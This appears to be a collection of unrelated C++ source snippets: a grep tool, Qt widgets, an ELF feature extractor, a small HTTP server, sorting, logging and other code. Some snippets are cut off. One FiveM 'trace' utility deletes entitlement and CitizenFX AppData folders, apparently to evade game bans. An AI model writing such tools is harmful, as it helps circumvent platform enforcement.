    "#include <iostream>\n#include <vector>\n#include <string>\n#include <fstream>\n\nvoid highlightKeyword(const std::string& line, const std::string& keyword) {\n    size_t pos = line.find(keyword);\n    if (pos != std::string::npos) {\n        // Print the part before the keyword\n        std::cout << line.substr(0, pos);\n        // Highlight the keyword\n        std::cout << \"\\033[31m\" << line.substr(pos, keyword.length()) << \"\\033[0m\"; // Red\n        // Print the part after the keyword\n        std::cout << line.substr(pos + keyword.length()) << std::endl;\n    }\n}\n\n\n//ihate my life\nint main(int argc, char* argv[]) {\n    int argumentCount = argc - 1;\n \n    if (argumentCount < 2) {\n        std::cout << \"Usage: \" << argv[0] << \" <filename> <keyword>\" << std::endl;\n        return 1;\n    }\n\n    std::vector<std::string> arguments(argv + 1, argv + argc);\n    const std::string& filename = arguments[0];\n    const std::string& keyword = arguments[1];\n    std::cout << \"MFind search initiated for \" << \"\\033[31m\" << keyword << \" in \" << \"\\033[32m\" << filename << \"\\033[0m\" << std::endl;\n\n    std::ifstream inputFile(filename);\n    if (!inputFile.is_open()) {\n        std::cerr << \"Error opening file: \" << filename << std::endl;\n        return 1;\n    }\n\n    std::string line;\n    while (std::getline(inputFile, line)) {\n        highlightKeyword(line, keyword);\n    }\n    inputFile.close();\n    return 0;\n}\n\n",
    "#include \"centeredscrollarea.h\"\n#include \"hexagonlayout.h\"\n\n\nCenteredScrollArea::CenteredScrollArea(QWidget *parent)\n    : QAbstractScrollArea(parent), contentWidget(nullptr) {\n    // \u4f7f\u6eda\u52a8\u533a\u57df\u53ef\u4ee5\u63a5\u53d7\u7126\u70b9\u7528\u4e8e\u952e\u76d8\u6eda\u52a8\u7b49\u64cd\u4f5c\n    setFocusPolicy(Qt::StrongFocus);\n}\n\nvoid CenteredScrollArea::setWidget(QWidget *widget)\n{\n    contentWidget = widget;\n    contentWidget->setParent(viewport());  // \u5c06\u5185\u5bb9\u90e8\u4ef6\u653e\u5230 viewport \u4e2d\n    updateScrollBars();\n\n}\n\nvoid CenteredScrollArea::resizeEvent(QResizeEvent *event)\n{\n    QAbstractScrollArea::resizeEvent(event);\n    Sresize();\n}\n\nvoid CenteredScrollArea::updateScrollBars()\n{\n    if (!contentWidget)\n        return;\n\n    QSize contentSize = contentWidget->size();\n    QSize viewportSize = viewport()->size();\n\n    // \u8bbe\u7f6e\u6c34\u5e73\u6eda\u52a8\u6761\u8303\u56f4\n    horizontalScrollBar()->setRange(0, qMax(0, contentSize.width() - viewportSize.width()));\n    horizontalScrollBar()->setPageStep(viewportSize.width());\n\n    // \u8bbe\u7f6e\u5782\u76f4\u6eda\u52a8\u6761\u8303\u56f4\n    verticalScrollBar()->setRange(0, qMax(0, contentSize.height() - viewportSize.height()));\n    verticalScrollBar()->setPageStep(viewportSize.height());\n}\n\nvoid CenteredScrollArea::updateContentPosition()\n{\n    if (!contentWidget)\n        return;\n\n    QSize contentSize = contentWidget->size();\n    QSize viewportSize = viewport()->size();\n\n    // \u8ba1\u7b97\u6c34\u5e73\u548c\u5782\u76f4\u65b9\u5411\u4e0a\u7684\u5c45\u4e2d\u4f4d\u7f6e\n    int xOffset = qMax(0, (viewportSize.width() - contentSize.width()) / 2);\n    int yOffset = qMax(0, (viewportSize.height() - contentSize.height()) / 2);\n\n    // \u8bbe\u7f6e\u5185\u5bb9\u90e8\u4ef6\u7684\u4f4d\u7f6e\n    contentWidget->move(xOffset - horizontalScrollBar()->value(),\n                        yOffset - verticalScrollBar()->value());\n}\n\nvoid CenteredScrollArea::Sresize()\n{\n    if(contentWidget)\n        contentWidget->resize(dynamic_cast<HexagonLayout*>(contentWidget->layout())->sizeHint());\n    updateScrollBars();\n    updateContentPosition();\n}\n\nvoid CenteredScrollArea::scrollContentsBy(int dx, int dy)\n{\n    QAbstractScrollArea::scrollContentsBy(dx, dy);\n    updateContentPosition();\n}\n",
    "\n#include <elf.h>\n#include <fcntl.h>\n#include <unistd.h>\n\n#include <filesystem>\n\n#include <iostream>\n#include <chrono>\n#include <vector>\n#include <string>\n#include <map>\n#include <numeric>\n#include <algorithm>\n#include <functional>\n#include <unordered_map>\n#include <fstream>\n//mmap\n#include <sys/mman.h>\n#include <sys/stat.h>\n//demange cpp function names\n#include <cxxabi.h>\n//disassemble instructions from elf file\n#include <x86_64-linux-gnu/sys/ptrace.h>\n#include <x86_64-linux-gnu/sys/user.h>\n#include <x86_64-linux-gnu/sys/reg.h> \n#include <x86_64-linux-gnu/sys/wait.h>\n#include <x86_64-linux-gnu/bits/pthreadtypes.h>\n#include <x86_64-linux-gnu/bits/thread-shared-types.h>\n#include <x86_64-linux-gnu/bits/pthreadtypes-arch.h>\n#include <x86_64-linux-gnu/bits/stat.h>\n#include <x86_64-linux-gnu/bits/types/struct_sigstack.h>\n//filesystem:\n#include <filesystem>\n//for demangle cpp function names\n#include <cxxabi.h>\n\n\n#include \"autoencoder.h\"\n#include \"lstm.h\"\n#include \"matrix.h\"\n#include \"info_helper.h\"\n#include \"optimizers.h\"\n#include \"utils.h\"\n#include \"sampling_helper.h\"\n#include \"elfplusplus.h\"\n\n\nstd::map<std::string, std::vector<std::string>> file_symbols_map; //key: filename, value: (features, string table) \n\n\n\n\n//same like elf_walk, iterate folders and dump features, use the features to train on different types of elf files \n//\n\nstd::vector<std::string> list_files(const std::string& path) {\n    std::vector<std::string> files;\n    for (const auto& entry : std::filesystem::directory_iterator(path)) {\n            if (entry.is_directory()) {\n                \n                //make sure it's not a symlink\n                if (std::filesystem::is_symlink(entry.path())) {\n                    continue;\n                }else if (!std::filesystem::is_directory(entry.path())) {\n                    continue;\n                }\n                try {\n                    auto listed = list_files(entry.path().string());\n                    if (!listed.empty()) {\n                        files.insert(files.end(), listed.begin(), listed.end());\n                    }\n\n                }\n                catch (const std::filesystem::filesystem_error& ex) {\n                    std::cerr << ex.what() << std::endl;\n                    continue;\n                } \n                catch (const std::length_error& ex) {\n                    std::cerr << ex.what() << std::endl; \n                    continue;\n                }\n                \n            }\n            else if (entry.is_regular_file())\n            {\n                files.push_back(entry.path().string());\n            }\n            else {\n                //ignore symlinks\n                continue;\n            }   \n    }\n    return files;\n}\n\n\nprovallo::matrix<real_t> extract_elf_features(const std::string& elf_file) {\n\n    //open elf file\n    provallo::matrix<real_t> ret(0, 0);\n    int fd = open(elf_file.c_str(), O_RDONLY);\n    if (fd == -1) {\n        std::cout << \"Cannot open file: \" << elf_file << std::endl;\n        return provallo::matrix<real_t>(0, 0);\n    }\n\n    //stat size\n    struct stat st; \n    if (fstat(fd, &st) == -1) {\n        std::cout << \"Cannot stat file: \" << elf_file << std::endl;\n        return provallo::matrix<real_t>(0, 0);\n    }\n\n    //mmap\n    void* addr = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);\n    if (addr == MAP_FAILED) {\n        std::cout << \"Cannot mmap file: \" << elf_file << std::endl;\n        return provallo::matrix<real_t>(0, 0);\n    }   \n    //extract features\n    try \n    {\n        \n        Elf64_Ehdr* ehdr = (Elf64_Ehdr*)addr;\n\n        if (ehdr->e_ident[EI_MAG0] != 0x7f\n            || ehdr->e_ident[EI_MAG1] != 'E'\n            || ehdr->e_ident[EI_MAG2] != 'L'\n            || ehdr->e_ident[EI_MAG3] != 'F') \n        {\n            std::cout << \"Not an ELF file: \" << elf_file << std::endl;\n            munmap(addr, st.st_size);\n            close(fd);\n            return provallo::matrix<real_t>(0, 0);\n        }\n        elfpp::ElfFile64 elf(ehdr);\n        ret = elf.features();\n        auto names = elf.get_section_names();\n        std::cout <<\"[+]\"<<elf_file<< \"::Names:(\" << std::to_string(names.size()) << \")\"  << std::endl; \n        std::cout <<\"[+]\"<<elf_file<< \"::Features:(\" << std::to_string(ret.size1()) <<\",\"<< std::to_string(ret.size2()) << \")\"  << std::endl;\n        \n        //add to map\n\n        file_symbols_map.insert(std::pair<std::string, std::vector<std::string>>(elf_file, names)); \n\n        real_t ratio =ret.size1()*ret.size2() / names.size();\n        size_t sample_size = ratio*names.size();\n\n        std::cout <<\"[+]\"<<elf_file<< \"::Sample size:(\" << std::to_string(sample_size) << \")\"  << std::endl; \n\n        std::cout <<\"[+]\"<<elf_file<< \"::Ratio:(\" << std::to_string(ratio) << \")\"  << std::endl;\n\n        //set purple text\n\n        size_t sample_index = 0;\n\n        for (auto& name : names) {\n\n            if (name.length() > 0) {\n                \n                //print name\n                std::cout << \"[+]\\033[35m\" << elf_file <<",
    "#include \"../header/server.hpp\"\n#include \"../header/read_conf.hpp\"\n\nServer::Server(int port) {\n    server_fd = socket(AF_INET, SOCK_STREAM, 0);\n    if (server_fd == 0) {\n        std::cerr << \"Failed to create socket\\n\";\n        exit(EXIT_FAILURE);\n    }\n\n    configureSocket();\n\n    address.sin_family = AF_INET;\n    address.sin_addr.s_addr = INADDR_ANY;\n    address.sin_port = htons(port);\n    \n    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {\n        std::cerr << \"Bind Failed\\n\";\n        exit(EXIT_FAILURE);\n    }\n}\n\nServer::~Server() {\n    close(server_fd);\n}\n\nvoid Server::configureSocket() {\n    int opt = 1;\n    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt));\n}\n\nvoid Server::start() {\n    listenForConnections();\n}\n\nvoid Server::listenForConnections() {\n    if (listen(server_fd, 3) < 0) {\n        std::cerr << \"Listening failed\\n\";\n        exit(EXIT_FAILURE);\n    }\n\n    std::cout << GREEN << \"Server is running...\\n\" << RESET;\n    std::cout << GREEN << \"Server is listening on port.... \" << RESET << std::endl; \n\n    while (true) {\n        int addrlen = sizeof(address);\n        int new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen);\n        if (new_socket < 0) {\n            std::cerr << \"Connection error\\n\";\n            continue;\n        }\n\n        handleConnection(new_socket);\n    }\n}\n\nvoid Server::handleConnection(int new_socket) {\n    char buffer[1024] = {0};\n    read(new_socket, buffer, 1024);\n\n    if (strstr(buffer, \"GET /\") != nullptr) {\n        if (met_get(buffer, new_socket)) return;\n    } else {\n        const char *http_response =\n            \"HTTP/1.1 200 OK\\r\\n\"\n            \"Content-Type: text/html\\r\\n\"\n            \"Content-Length: 40\\r\\n\"\n            \"\\n\"\n            \"<h1>Hello World :)</h1>\";\n        send(new_socket, http_response, strlen(http_response), 0);\n        std::cout << YELLOW << \"Response sent to client\" << RESET << \"[GET]\" << std::endl;\n    }\n\n    close(new_socket);\n}\n",
    "#include <iostream>\n#include <cmath>\n\n\nconst int WIDTH = 800;\nconst int HEIGHT = 600;\nconst int MAX_ITERATIONS = 255;\n\nint mandelbrot(double x, double y) {\n    std::complex<double> z = 0;\n    std::complex<double> c(x, y);\n    int iterations = 0;\n    while (std::abs(z) < 2 && iterations < MAX_ITERATIONS) {\n        z = z * z + c;\n        iterations++;\n    }\n    return iterations;\n}\n\n\nvoid createImage(int image[]) {\n    for (int y = 0; y < HEIGHT; y++) {\n        for (int x = 0; x < WIDTH; x++) {\n            double real = -2.5 + x * 3.5 / WIDTH;\n            double imag = -2.0 + y * 2.0 / HEIGHT;\n            int iterations = mandelbrot(real, imag);\n            image[y * WIDTH + x] = iterations;\n        }\n    }\n}\n\n\nvoid writePPM(const char* filename, int image[]) {\n    std::ofstream file(filename);\n    file << \"P3\\n\" << WIDTH << \" \" << HEIGHT << \"\\n255\\n\";\n    for (int i = 0; i < WIDTH * HEIGHT; i++) {\n        int color = image[i] % 256;\n        file << color << \" \" << color << \" \" << color << \"\\n\";\n    }\n}\n\nint main() {\n    int image[WIDTH * HEIGHT];\n    createImage(image);\n    writePPM(\"mandelbrot.ppm\", image);\n    return 0;\n}\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <iterator>\r\n#include <algorithm>\r\n\r\nnamespace Dsa {\r\n    template<class RandomIt, class Compare = std::less<>>\r\n    constexpr void merge(RandomIt first, RandomIt mid, RandomIt last, \r\n        Compare comp = Compare()) \r\n    {\r\n        auto leftSize = std::distance(first, mid);\r\n        auto rightSize = std::distance(mid, last);\r\n    \r\n        std::vector<typename std::iterator_traits<RandomIt>::value_type> left(\r\n            first, mid);\r\n        std::vector<typename std::iterator_traits<RandomIt>::value_type> right(\r\n            mid, last);\r\n            \r\n        auto leftIt = left.begin();\r\n        auto rightIt = right.begin();\r\n        auto resultIt = first;\r\n    \r\n        while (leftIt != left.end() && rightIt != right.end()) {\r\n            if (comp(*rightIt, *leftIt)) {\r\n                *resultIt++ = *rightIt++;\r\n            } else {\r\n                *resultIt++ = *leftIt++;\r\n            }\r\n        }\r\n    \r\n        while (leftIt != left.end()) {\r\n            *resultIt++ = *leftIt++;\r\n        }\r\n    \r\n        while (rightIt != right.end()) {\r\n            *resultIt++ = *rightIt++;\r\n        }\r\n    }\r\n    \r\n    template<class RandomIt, class Compare = std::less<>>\r\n    constexpr void sort(RandomIt first, RandomIt last, Compare comp = Compare())\r\n    {\r\n        auto length = std::distance(first, last);\r\n        \r\n        if (length > 1) {\r\n            auto mid = std::next(first, length / 2);\r\n            \r\n            Dsa::sort(first, mid, comp);\r\n            Dsa::sort(mid, last, comp);\r\n            \r\n            Dsa::merge(first, mid, last, comp);\r\n        }\r\n    }\r\n}\r\n\r\nint main() {\r\n    struct {\r\n        constexpr bool operator()(int a, int b) const {\r\n            return a < b;    \r\n        }\r\n    } customLess;\r\n    \r\n    struct {\r\n        constexpr bool operator()(int a, int b) const {\r\n            return a > b;    \r\n        }\r\n    } customBigger;\r\n    \r\n    std::vector<int> v{5, 2, 4, 6, 4, 1, 3};\r\n    \r\n    auto printV = [&v](std::string_view message) {\r\n        std::cout << message << \": \";\r\n        \r\n        for (auto elem : v) {\r\n            std::cout << elem << \" \";\r\n        }\r\n        \r\n        std::cout << \"\\n\";\r\n    };\r\n    \r\n    Dsa::sort(v.begin(), v.end());\r\n    printV(\"Elementi ordinati con comparatore standard\");\r\n    \r\n    Dsa::sort(v.begin(), v.end(), customLess);\r\n    printV(\"Elementi ordinati con comparatore customLess\");\r\n    \r\n    Dsa::sort(v.begin(), v.end(), customBigger);\r\n    printV(\"Elementi ordinati con comparatore customBigger\");\r\n}",
    "/* This file makes use of Doxygen syntax for generating documentation. */\n/******************************************************************************/\n/**\n *\n * @file log_msg.cpp\n * @brief Function definitions for log message functions.\n *\n * This contains the function definitions for the log message functions.\n *\n * @author John H. Willis (willisjh)\n * @date 19 September 2021\n *\n * @bug No known bugs.\n *\n * @addtogroup LogMsg\n * @{\n *\n ******************************************************************************/\n\n\n/******************************** Include Files *******************************/\n#include \"log_msg.hpp\"\n\n#include <ctime>\n#include <iomanip>\n#include <vector>\n#include <thread>\n#include <sstream>\n#include <map>\n#include <iostream>\n\n#ifdef __unix__\n#include <syslog.h>\n#endif\n\n/**************************** Constant Definitions ****************************/\nconst std::map<const IDPriority, const std::string> kMpIdPriorityStringPriority{ {IDPriority::kIdTrace, \"TRACE\"}, {IDPriority::kIdDebug, \"DEBUG\"}, {IDPriority::kIdInfo, \"INFO\"}, {IDPriority::kIdNotice, \"NOTICE\"}, {IDPriority::kIdWarning, \"WARNING\"}, {IDPriority::kIdErr, \"ERR\"}, {IDPriority::kIdCrit, \"CRIT\"}, {IDPriority::kIdAlert, \"ALERT\"}, {IDPriority::kIdEmerg, \"EMERG\"} };\nconstexpr const char* kSzIdPriorityUnknown = \"UNKNOWN\";\n\n#ifdef __unix__\nconstexpr auto kIdFacility = LOG_USER;\n\nconst std::map<const IDPriority, const auto> kMpIdPriorityIdPrioritySyslog{ {IDPriority::kIdTrace, LOG_DEBUG}, {IDPriority::kIdDebug, LOG_DEBUG}, {IDPriority::kIdInfo, LOG_INFO}, {IDPriority::kIdNotice, LOG_NOTICE}, {IDPriority::kIdWarning, LOG_WARNING}, {IDPriority::kIdErr, LOG_ERR}, {IDPriority::kIdCrit, LOG_CRIT}, {IDPriority::kIdAlert, LOG_ALERT}, {IDPriority::kIdEmerg, LOG_EMERG} };\n#endif\n\n\n/* Manually update with largest kMpIdPriorityStringPriority priority identifier string above. */\nconstexpr auto kCBStringIdPriorityLast = sizeof(\"WARNING\");\n\n/* Strings may exceed these and shift message formatting. Change as needed. */\nconstexpr auto kCBStringIdThreadLast = 15;\nconstexpr auto kCBStringLocationCodeLast = 15;\n\n/*********************** Static Variable Initializations **********************/\n\n/****************************** Type Definitions ******************************/\n\n/***************************** Function Prototypes ****************************/\n\n/**************************** Function Definitions ****************************/\n\n\n/******************************************************************************/\n/**\n * Function for getting string representation of priority.\n *\n * @param[in] id_priority The identifier of the priority.\n *\n * @return string_priority The string representation of priority.\n *\n * @note Unsupported priority levels are given a default string.\n *\n ******************************************************************************/\nstd::string StringPriorityFromidPriority(IDPriority id_priority)\n{\n    if (kMpIdPriorityStringPriority.find(id_priority) != kMpIdPriorityStringPriority.end())\n    {\n        return kMpIdPriorityStringPriority.at(id_priority);\n    }\n    else\n    {\n        return std::string(kSzIdPriorityUnknown);\n    }\n}\n\n#ifdef __unix__\n/******************************************************************************/\n/**\n * Function for getting syslog identifier of priority.\n *\n * @param[in] id_priority The identifier of the priority.\n *\n * @return id_priority_syslog The identifier of priority for syslog.\n *\n * @note Unsupported priority levels are given a default string.\n *\n ******************************************************************************/\nint IdPrioritySyslogFromidPriority(IDPriority id_priority)\n{\n    if (kMpIdPriorityIdPrioritySyslog.find(id_priority) != kMpIdPriorityIdPrioritySyslog.end())\n    {\n        return kMpIdPriorityIdPrioritySyslog.at(id_priority);\n    }\n    else\n    {\n        return LOG_DEBUG;\n    }\n}\n#endif\n\n/******************************************************************************/\n/**\n * Function for padding the back of a string.\n *\n * @param[in] string     The string to be padded.\n * @param[in] c_ch_last  The last count of characters for the resulting string.\n * @param[in] ch_padding The character to pad the string with.\n *\n * @return None.\n *\n * @note\n *\n ******************************************************************************/\nvoid PadStringBack(std::string& string, const size_t c_ch_last, const char ch_padding = ' ')\n{\n    if (c_ch_last > string.size())\n    {\n        string.insert(string.size(), c_ch_last - string.size(), ch_padding);\n    }\n}\n\n/******************************************************************************/\n/**\n * Function for logging with priority level and message.\n *\n * @param[in] sz_filename The zero-terminated string of the code filename.\n * @param[in] c_line      The count of the line number for the code.\n * @param[in] id_priority The identifier of the priority.\n * @param[in] message     The message for logging.\n *\n * @return None.\n *\n * @note\n *\n *********",
    "#include \"SecondScreenCanvas.hpp\"\r\n\r\nResizedLayoutGridCanvas::ResizedLayoutGridCanvas(const QSizeF& size) noexcept\r\n    : m_size(size)\r\n    , m_needToSort(false)\r\n{\r\n    m_widgetFuturPoses.emplace_back(0.0, 0.0);\r\n}\r\n\r\nvoid ResizedLayoutGridCanvas::Scale(std::vector<WidgetGeometry>& contentVector, double coef) noexcept\r\n{\r\n    Q_ASSERT(coef > 0 && coef <= 1.0);\r\n    for (WidgetGeometry& geometry : contentVector)\r\n    {\r\n        if (!geometry.m_isPosFixed)\r\n        {\r\n            geometry.m_size = geometry.m_layoutItem->Geometry().size() * coef;\r\n            QSizeF minSize = geometry.m_layoutItem->minimumSize();\r\n            if (geometry.m_size.width() < minSize.width() || geometry.m_size.height() < minSize.height())\r\n            {\r\n                geometry.m_size = minSize;\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\n\r\nconst std::vector<WidgetGeometry>& ResizedLayoutGridCanvas::GetGeometries() const noexcept\r\n{\r\n    return m_widgetsToInsert;\r\n}\r\n\r\nbool ResizedLayoutGridCanvas::Insert(std::vector<WidgetGeometry>& contentVector, double scaleParam) noexcept\r\n{\r\n\r\n    if (contentVector.empty())\r\n    {\r\n        return true;\r\n    }\r\n    else\r\n    {\r\n        std::vector<WidgetGeometry>::const_iterator it = contentVector.cbegin();\r\n        while (it!=contentVector.cend() && it->m_isPosFixed)\r\n        {\r\n            if (CanInsert(*it))\r\n            {\r\n                Use(*it);\r\n                std::advance(it, 1);\r\n            }\r\n            else\r\n            {\r\n                return false;\r\n            }\r\n        }\r\n        Scale(contentVector, scaleParam);\r\n        while (it != contentVector.cend())\r\n        {\r\n            const WidgetGeometry& content = *it;\r\n            if (Insert(content))\r\n            {\r\n                ++it;\r\n            }\r\n            else\r\n            {\r\n                return false;\r\n            }\r\n        }\r\n        return true;\r\n    }\r\n}\r\n\r\nbool ResizedLayoutGridCanvas::Insert(WidgetGeometry content) noexcept\r\n{\r\n\r\n    Sort();\r\n\r\n    for (std::list<QPointF>::const_iterator itor = m_widgetFuturPoses.cbegin(); itor != m_widgetFuturPoses.cend(); ++itor)\r\n    {\r\n\r\n        content.m_futurPos = *itor;\r\n\r\n        if (CanInsert(content))\r\n        {\r\n\r\n            Use(content);\r\n            m_widgetFuturPoses.erase(itor);\r\n            return true;\r\n        }\r\n    }\r\n\r\n    // \u041f\u043e\u043f\u0440\u043e\u0431\u043e\u0432\u0430\u0442\u044c \u043f\u043e\u0432\u043e\u0440\u043e\u0442\r\n    content.Transpose();\r\n    for (std::list<QPointF>::const_iterator itor = m_widgetFuturPoses.cbegin(); itor != m_widgetFuturPoses.cend(); ++itor)\r\n    {\r\n\r\n        content.m_futurPos = *itor;\r\n\r\n        if (CanInsert(content))\r\n        {\r\n            Use(content);\r\n            m_widgetFuturPoses.erase(itor);\r\n            return true;\r\n        }\r\n    }\r\n\r\n\r\n    return false;\r\n}\r\n\r\nbool ResizedLayoutGridCanvas::CanInsert(const WidgetGeometry& content) const noexcept\r\n{\r\n\r\n    if ((content.m_futurPos.x() + content.m_size.width()) > m_size.width())\r\n        return false;\r\n\r\n    if ((content.m_futurPos.y() + content.m_size.height()) > m_size.height())\r\n        return false;\r\n\r\n    for (std::vector<WidgetGeometry>::const_iterator itor = m_widgetsToInsert.cbegin(); itor != m_widgetsToInsert.cend(); ++itor)\r\n    {\r\n        if (content.Intersects(*itor))\r\n        {\r\n            return false;\r\n        }\r\n    }\r\n\r\n\r\n    return true;\r\n}\r\n\r\nbool ResizedLayoutGridCanvas::Use(const WidgetGeometry& content) noexcept\r\n{\r\n    const QSizeF& size = content.m_size;\r\n    const QPointF& coord = content.m_futurPos;\r\n\r\n    m_widgetFuturPoses.emplace_front(coord.x() + size.width(), coord.y());\r\n    m_widgetFuturPoses.emplace_back(coord.x(), coord.y() + size.height());\r\n\r\n    m_widgetsToInsert.push_back(content);\r\n\r\n    m_needToSort = true;\r\n\r\n    return true;\r\n}\r\n\r\nvoid ResizedLayoutGridCanvas::Sort() noexcept\r\n{\r\n    if (m_needToSort)\r\n    {\r\n        // \u0435\u0441\u043b\u0438 \u0440\u0430\u0441\u0441\u0442\u043e\u044f\u043d\u0438\u0435 \u043e\u0442 \u043d\u0430\u0447\u0430\u043b\u0430 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442 \u0434\u043e \u0442\u043e\u0447\u043a\u0438 a \u043c\u0435\u043d\u044c\u0448\u0435, \u0447\u0435\u043c \u0440\u0430\u0441\u0441\u0442\u043e\u044f\u043d\u0438\u0435 \u043e\u0442 \u043d\u0430\u0447\u0430\u043b\u0430 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442 \u0434\u043e \u0442\u043e\u0447\u043a\u0438 b\r\n        //\u0420\u0430\u0441\u0441\u0442\u043e\u044f\u043d\u0438\u0435 \u043e\u0442 \u043d\u0430\u0447\u0430\u043b\u0430 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442 \u0434\u043e \u0442\u043e\u0447\u043a\u0438 (x, y) \u0432\u044b\u0447\u0438\u0441\u043b\u044f\u0435\u0442\u0441\u044f \u043a\u0430\u043a sqrt(x^2 + y^2), \u043d\u043e \u0432 \u0434\u0430\u043d\u043d\u043e\u043c \u0441\u043b\u0443\u0447\u0430\u0435, \u0447\u0442\u043e\u0431\u044b \u0438\u0437\u0431\u0435\u0436\u0430\u0442\u044c \u0432\u044b\u0447\u0438\u0441\u043b\u0435\u043d\u0438\u044f \u043a\u0432\u0430\u0434\u0440\u0430\u0442\u043d\u043e\u0433\u043e \u043a\u043e\u0440\u043d\u044f (\u043a\u043e\u0442\u043e\u0440\u043e\u0435 \u043c\u043e\u0436\u0435\u0442 \u0431\u044b\u0442\u044c\r\n        //\u0434\u043e\u0440\u043e\u0433\u043e\u0441\u0442\u043e\u044f\u0449\u0438\u043c \u043e\u043f\u0435\u0440\u0430\u0442\u043e\u0440\u043e\u043c), \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u0442\u0441\u044f \u043a\u0432\u0430\u0434\u0440\u0430\u0442 \u0440\u0430\u0441\u0441\u0442\u043e\u044f\u043d\u0438\u044f (x^2 + y^2).\r\n        //        m_widgetFuturPoses.sort([](const QPointF& a, const QPointF& b) { return (a.x() * a.x() + a.y() * a.y()) < (b.x() * b.x() + b.y() * b.y()); });\r\n\r\n        m_widgetFuturPoses.sort([](const QPointF& a, const QPointF& b) { return a.y() < b.y(); });\r\n        m_needToSort = false;\r\n    }\r\n}\r\n",
    "#include \"trace.hpp\"\r\n\r\nvoid trace::setup()\r\n{\r\n\t// Locate Appdata\r\n\tstd::string appdata = getenv(\"LOCALAPPDATA\");\r\n\tstd::string localappdata = getenv(\"APPDATA\");\r\n\r\n\t// Locate DigitalElements\r\n\tappdata = appdata + \"\\\\\" + \"DigitalEntitlements\";\r\n\tif(std::filesystem::remove_all(appdata))\r\n\t{\r\n\t\tstd::cout << \"Removed: \" << appdata << std::endl;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tstd::cout << \"Couldn't Find: \" << appdata << std::endl;\r\n\t}\r\n\r\n\t// Locate CitizenFX\r\n\tappdata = localappdata + \"\\\\\" + \"CitizenFX\";\r\n\tif (std::filesystem::remove_all(appdata))\r\n\t{\r\n\t\tstd::cout << \"Removed: \" << appdata << std::endl;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tstd::cout << \"Couldn't Find: \" << appdata << std::endl;\r\n\t}\r\n}\r\n\r\nINT CALLBACK browse_callback_proc(HWND hwnd, UINT uMsg, LPARAM lp, LPARAM pData)\r\n{\r\n\tif (uMsg == BFFM_INITIALIZED) SendMessage(hwnd, BFFM_SETSELECTION, TRUE, pData);\r\n\treturn 0;\r\n}\r\n\r\nvoid trace::destroy()\r\n{\r\n\tm_fivem_path.clear();\r\n\tstd::remove(m_save_path.c_str());\r\n}\r\n\r\nstd::string trace::set_folder(std::string title)\r\n{\r\n\tstd::ifstream path(m_save_path);\r\n\tif (!path.good())\r\n\t{\r\n\t\tstd::string appdata = getenv(\"LOCALAPPDATA\");\r\n\t\tauto fivem_path = appdata + \"\\\\\" + \"FiveM\";\r\n\r\n\t\tBROWSEINFO br;\r\n\t\tZeroMemory(&br, sizeof(BROWSEINFO));\r\n\t\tbr.lpfn = browse_callback_proc;\r\n\t\tbr.ulFlags = BIF_RETURNONLYFSDIRS | BIF_NEWDIALOGSTYLE;\r\n\t\tbr.hwndOwner = NULL;\r\n\t\tbr.lpszTitle = title.c_str();\r\n\t\tbr.lParam = (LPARAM)fivem_path.c_str();\r\n\r\n\t\tstd::string ret;\r\n\r\n\t\tLPITEMIDLIST pidl = NULL;\r\n\t\tif ((pidl = SHBrowseForFolder(&br)) != NULL)\r\n\t\t{\r\n\t\t\tchar buffer[_MAX_PATH];\r\n\t\t\tif (SHGetPathFromIDList(pidl, buffer)) ret = buffer;\r\n\t\t}\r\n\r\n\t\tif (!std::filesystem::exists(ret + \"\\\\\" + \"FiveM.exe\"))\r\n\t\t{\r\n\t\t\treturn std::string();\r\n\t\t}\r\n\r\n\t\tif (!ret.empty())\r\n\t\t{\r\n\t\t\tstd::ofstream save_path(m_save_path);\r\n\t\t\tsave_path << ret << std::endl;\r\n\t\t\tsave_path.close();\r\n\t\t}\r\n\r\n\t\treturn ret;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tstd::string name;\r\n\t\tpath >> name;\r\n\t\treturn name;\r\n\t}\r\n}\r\n\r\n\r\nvoid trace::set_launch_build()\r\n{\r\n\tint choice;\r\n\r\n\tstd::vector<const char*> m_builds = { \"2545\", \"2372\", \"2189\", \"2060\", \"1604\" };\r\n\r\n\tfor (int i = 0; i < m_builds.size(); i++)\r\n\t{\r\n\t\tstd::cout << \"  [\" << i + 1 << \"]  :  \" << m_builds[i] << std::endl;\r\n\t}\r\n\tstd::cin >> choice;\r\n\r\n\tauto path = std::string(m_fivem_path + m_citizen_ini_path).c_str();\r\n\r\n\tif (std::filesystem::exists(path))\r\n\t{\r\n\t\tWritePrivateProfileString(\"Game\", \"SavedBuildNumber\", m_builds[choice - 1], path);\r\n\t}\r\n}\r\n\r\nstd::string trace::get_launch_build()\r\n{\r\n\tauto path = std::string(m_fivem_path + m_citizen_ini_path).c_str();\r\n\tauto buildNumber = 0;\r\n\r\n\tif (std::filesystem::exists(path))\r\n\t{\r\n\t\tbuildNumber = GetPrivateProfileInt(\"Game\", \"SavedBuildNumber\", buildNumber, path);\r\n\t}\r\n\treturn std::to_string(buildNumber);\r\n}\r\n\r\n\r\n",
    "#include <iostream>\n#include <string>\nusing namespace std;\n\nclass Employee {\nprotected:\n    int id;\n    string name;\n    string shift;\n    string startHour;\n    string endHour;\n\npublic:\n    void inputBasicInfo() {\n        cout << \"Enter Employee ID: \";\n        cin >> id;\n        cout << \"Enter Employee Name: \";\n        cin.ignore();\n        getline(cin, name);\n    }\n\n    void inputShift() {\n        int shiftChoice;\n        cout << \"Select Shift (1 for Day, 2 for Night): \";\n        cin >> shiftChoice;\n\n        if (shiftChoice == 1) {\n            shift = \"Day\";\n            startHour = \"9 AM\";\n            endHour = \"5 PM\";\n        } else if (shiftChoice == 2) {\n            shift = \"Night\";\n            startHour = \"8 PM\";\n            endHour = \"3 AM\";\n        } else {\n            cout << \"Invalid choice, defaulting to Day shift.\\n\";\n            shift = \"Day\";\n            startHour = \"9 AM\";\n            endHour = \"5 